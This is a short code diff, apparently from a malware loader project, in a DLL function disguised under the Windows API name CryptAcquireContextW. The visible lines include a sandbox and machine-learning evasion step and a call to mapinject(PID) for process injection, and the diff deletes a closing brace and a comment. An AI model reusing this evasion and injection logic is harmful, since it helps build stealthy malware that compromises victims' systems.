@@ -172,7 +172,6 @@ __declspec(dllexport) void CryptAcquireContextW() {
             CustomExitProcess();
         }
     }
-}
 
     // Evade ML and Sandboxing checks
     stale();
@@ -187,7 +186,6 @@ __declspec(dllexport) void CryptAcquireContextW() {
 
     // Check if the PID is valid (not 0, indicating a failure)
     if (PID != 0) {
-        // Call mapinject with the obtained PID
         mapinject(PID);
     } else {
         ExitProcess(1);
